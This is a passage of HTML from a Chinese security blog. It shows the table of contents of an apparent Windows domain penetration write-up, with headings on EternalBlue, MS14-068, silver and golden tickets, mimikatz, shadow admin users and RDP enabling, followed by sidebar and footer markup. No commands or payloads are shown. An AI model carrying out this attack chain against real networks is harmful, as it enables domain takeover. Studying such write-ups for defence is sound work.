class="toc-number">1.8.5.</span> <span class="toc-text"> MS17-010永恒之蓝打域控</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8ms17_010"><span class="toc-number">1.8.5.1.</span> <span class="toc-text"> 使用ms17_010</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C"><span class="toc-number">1.8.5.2.</span> <span class="toc-text"> 结果</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%88%90%E5%8A%9F"><span class="toc-number">1.8.5.3.</span> <span class="toc-text"> 提权成功</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ms14-068%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83-cve-2014-6324"><span class="toc-number">1.8.6.</span> <span class="toc-text"> MS14-068域控提权 CVE-2014-6324</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B"><span class="toc-number">1.8.6.1.</span> <span class="toc-text"> 流程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%9F%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7"><span class="toc-number">1.8.6.1.1.</span> <span class="toc-text"> 域普通用户</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95"><span class="toc-number">1.8.6.1.1.1.</span> <span class="toc-text"> 连接测试</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%89%93%E5%BC%80"><span class="toc-number">1.8.6.1.1.2.</span> <span class="toc-text"> 打开</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E6%B5%8B%E8%AF%95"><span class="toc-number">1.8.6.1.1.3.</span> <span class="toc-text"> 登录测试</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C-2"><span class="toc-number">1.8.6.1.1.4.</span> <span class="toc-text"> 结果</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E8%AE%BF%E9%97%AEdc%E5%9F%9F%E6%8E%A7%E6%9C%BA%E5%99%A8%E7%9A%84c%E7%9B%98"><span class="toc-number">1.8.6.1.1.5.</span> <span class="toc-text"> 尝试访问dc域控机器的C盘</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">1.8.6.1.2.</span> <span class="toc-text"> 创建白银票据</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">1.8.6.1.2.1.</span> <span class="toc-text"> 使用工具</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C-2"><span class="toc-number">1.8.6.1.2.2.</span> <span class="toc-text"> 执行</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E5%88%9B%E5%BB%BA%E7%A5%A8%E6%8D%AE"><span class="toc-number">1.8.6.1.2.3.</span> <span class="toc-text"> 成功创建票据</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%A5%A8%E6%8D%AE"><span class="toc-number">1.8.6.1.3.</span> <span class="toc-text"> 注入票据</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%B7%A5%E5%85%B7mimikatz"><span class="toc-number">1.8.6.1.3.1.</span> <span class="toc-text"> 使用工具mimikatz</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%B7%A5%E5%85%B7-2"><span class="toc-number">1.8.6.1.3.2.</span> <span class="toc-text"> 使用工具</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B0%86%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B0%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E4%B8%8A"><span class="toc-number">1.8.6.1.3.3.</span> <span class="toc-text"> 将文件上传到目标机器上</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E6%89%A7%E8%A1%8C"><span class="toc-number">1.8.6.1.3.4.</span> <span class="toc-text"> 然后执行</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AF%B9%E4%BA%8E%E7%A5%A8%E6%8D%AE%E7%9A%84%E6%93%8D%E4%BD%9C"><span class="toc-number">1.8.6.1.3.5.</span> <span class="toc-text"> 对于票据的操作</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E5%AF%BC%E5%85%A5%E7%A5%A8%E6%8D%AE"><span class="toc-number">1.8.6.1.3.6.</span> <span class="toc-text"> 成功导入票据</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEdc"><span class="toc-number">1.8.6.1.4.</span> <span class="toc-text"> 访问dc</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%86%8D%E6%AC%A1%E5%B0%9D%E8%AF%95%E8%AE%BF%E9%97%AEdc%E5%9F%9F%E6%8E%A7%E7%9A%84c%E7%9B%98%E6%96%87%E4%BB%B6"><span class="toc-number">1.8.6.1.4.1.</span> <span class="toc-text"> 再次尝试访问dc域控的C盘文件</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E8%AE%BF%E9%97%AE"><span class="toc-number">1.8.6.1.4.2.</span> <span class="toc-text"> 成功访问</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90"><span class="toc-number">1.8.6.1.5.</span> <span class="toc-text"> 获取域控超级管理员权限</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.8.6.1.5.1.</span> <span class="toc-text"> 思路：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7"><span class="toc-number">1.8.6.1.5.2.</span> <span class="toc-text"> 生成攻击载荷</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E5%88%B0%E7%9B%AE%E6%A0%87%E6%9C%BA"><span class="toc-number">1.8.6.1.5.3.</span> <span class="toc-text"> 上传到目标机</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B0%86%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7copy%E5%88%B0dc%E5%9F%9F%E6%8E%A7%E6%9C%BA"><span class="toc-number">1.8.6.1.5.4.</span> <span class="toc-text"> 将攻击载荷copy到dc域控机</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8at%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6"><span class="toc-number">1.8.6.1.5.5.</span> <span class="toc-text"> 使用at命令执行文件</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E4%B8%8A%E7%BA%BF"><span class="toc-number">1.8.6.1.5.6.</span> <span class="toc-text"> 成功上线</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E8%BF%81%E7%A7%BB"><span class="toc-number">1.8.6.1.5.7.</span> <span class="toc-text"> 进程迁移</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00x8-%E5%9F%9F%E6%94%BB%E5%87%BB"><span class="toc-number">1.9.</span> <span class="toc-text"> 00x8-域攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dc%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.9.1.</span> <span class="toc-text"> dc域信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E6%90%9C%E9%9B%86"><span class="toc-number">1.9.1.1.</span> <span class="toc-text"> 密码搜集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%88%B7sid%E6%90%9C%E9%9B%86"><span class="toc-number">1.9.1.2.</span> <span class="toc-text"> 用户SID搜集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E7%AB%AF%E5%8F%A3%E5%BC%80%E6%94%BE"><span class="toc-number">1.9.1.3.</span> <span class="toc-text"> 确定端口开放</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2"><span class="toc-number">1.9.2.</span> <span class="toc-text"> 登录远程桌面</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.9.2.1.</span> <span class="toc-text"> 步骤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%80%E5%90%AF3389"><span class="toc-number">1.9.2.2.</span> <span class="toc-text"> 开启3389</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E5%BD%B1%E5%AD%90%E7%94%A8%E6%88%B7"><span class="toc-number">1.9.2.3.</span> <span class="toc-text"> 制作影子用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BB%E5%BD%95"><span class="toc-number">1.9.2.4.</span> <span class="toc-text"> 登录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0administractor%E5%88%86%E7%BB%84"><span class="toc-number">1.9.2.5.</span> <span class="toc-text"> 添加administractor分组</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E7%99%BB%E5%BD%95"><span class="toc-number">1.9.2.6.</span> <span class="toc-text"> 成功登录</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E6%8E%A7%E7%BB%B4%E6%9D%83"><span class="toc-number">1.9.3.</span> <span class="toc-text"> 域控维权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">1.9.3.1.</span> <span class="toc-text"> 制作黄金票据</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E9%9C%80%E8%A6%81%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.9.3.1.1.</span> <span class="toc-text"> 制作黄金票据需要的条件</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1%E5%9F%9F%E5%90%8D%E7%A7%B0"><span class="toc-number">1.9.3.1.1.1.</span> <span class="toc-text"> 1.域名称</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2%E5%9F%9F%E7%9A%84sid%E5%80%BC"><span class="toc-number">1.9.3.1.1.2.</span> <span class="toc-text"> 2.域的SID值</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3%E5%9F%9F%E7%9A%84krbtgt%E8%B4%A6%E6%88%B7ntlm%E5%AF%86%E7%A0%81%E5%93%88%E5%B8%8C"><span class="toc-number">1.9.3.1.1.3.</span> <span class="toc-text"> 3.域的KRBTGT账户NTLM密码哈希</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#4%E4%BC%AA%E9%80%A0%E7%94%A8%E6%88%B7%E5%90%8D"><span class="toc-number">1.9.3.1.1.4.</span> <span class="toc-text"> 4.伪造用户名</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-2"><span class="toc-number">1.9.3.1.2.</span> <span class="toc-text"> 步骤</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B8%85%E9%99%A4%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">1.9.3.1.3.</span> <span class="toc-text"> 清除白银票据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AF%BC%E5%87%BAkrbtgt%E7%9A%84hash-sid%E5%80%BC"><span class="toc-number">1.9.3.1.4.</span> <span class="toc-text"> 导出krbtgt的Hash、SID值</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96krbtgt%E7%9A%84hash"><span class="toc-number">1.9.3.1.4.1.</span> <span class="toc-text"> 获取krbtgt的Hash</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C-3"><span class="toc-number">1.9.3.1.4.2.</span> <span class="toc-text"> 结果</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96krbtgt%E7%9A%84sid%E5%80%BC"><span class="toc-number">1.9.3.1.4.3.</span> <span class="toc-text"> 获取krbtgt的SID值</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%94%9F%E6%88%90golden-ticket"><span class="toc-number">1.9.3.1.5.</span> <span class="toc-text"> 生成Golden Ticket</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C"><span class="toc-number">1.9.3.1.5.1.</span> <span class="toc-text"> 制作</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%94%9F%E6%88%90"><span class="toc-number">1.9.3.1.5.2.</span> <span class="toc-text"> 生成</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AF%BC%E5%85%A5%E4%BC%AA%E9%80%A0"><span class="toc-number">1.9.3.1.6.</span> <span class="toc-text"> 导入伪造</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AF%BC%E5%85%A5"><span class="toc-number">1.9.3.1.6.1.</span> <span class="toc-text"> 导入</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E8%AE%BF%E9%97%AEdc%E5%9F%9F%E6%8E%A7"><span class="toc-number">1.9.3.1.6.2.</span> <span class="toc-text"> 尝试访问dc域控</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00x9-%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E"><span class="toc-number">1.10.</span> <span class="toc-text"> 00x9-写在最后</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/05/05/3048848954.html" title="学习强国"><img src="https://s2.loli.net/2022/04/08/3sgAHoqV2mdCzU1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="学习强国"/></a><div class="content"><a class="title" href="/2022/05/05/3048848954.html" title="学习强国">学习强国</a><time datetime="2022-05-05T04:51:55.000Z" title="发表于 2022-05-05 12:51:55">2022-05-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/25/3261854512.html" title="VNCTF2022公开赛-WP"><img src="https://s2.loli.net/2022/04/08/yArF9MhpxCblkRJ.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="VNCTF2022公开赛-WP"/></a><div class="content"><a class="title" href="/2022/03/25/3261854512.html" title="VNCTF2022公开赛-WP">VNCTF2022公开赛-WP</a><time datetime="2022-03-25T15:07:42.000Z" title="发表于 2022-03-25 23:07:42">2022-03-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/12/3412727995.html" title="4年语雀会员免费领&amp;有道云笔记搬家"><img src="https://s2.loli.net/2022/04/08/yArF9MhpxCblkRJ.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="4年语雀会员免费领&amp;有道云笔记搬家"/></a><div class="content"><a class="title" href="/2022/03/12/3412727995.html" title="4年语雀会员免费领&amp;有道云笔记搬家">4年语雀会员免费领&amp;有道云笔记搬家</a><time datetime="2022-03-12T13:36:59.000Z" title="发表于 2022-03-12 21:36:59">2022-03-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/08/2984999730.html" title="渗透测试流程-资源汇总版"><img src="https://s2.loli.net/2022/04/08/3sgAHoqV2mdCzU1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="渗透测试流程-资源汇总版"/></a><div class="content"><a class="title" href="/2022/03/08/2984999730.html" title="渗透测试流程-资源汇总版">渗透测试流程-资源汇总版</a><time datetime="2022-03-08T14:37:03.000Z" title="发表于 2022-03-08 22:37:03">2022-03-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/07/3614044942.html" title="python图形化-wxPython"><img src="https://s2.loli.net/2022/04/08/RLAX9PN5ZmHuzgb.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="python图形化-wxPython"/></a><div class="content"><a class="title" href="/2022/03/07/3614044942.html" title="python图形化-wxPython">python图形化-wxPython</a><time datetime="2022-03-07T07:10:34.000Z" title="发表于 2022-03-07 15:10:34">2022-03-07</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://s2.loli.net/2022/04/08/yArF9MhpxCblkRJ.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By like4h</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">like4h's blog</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>
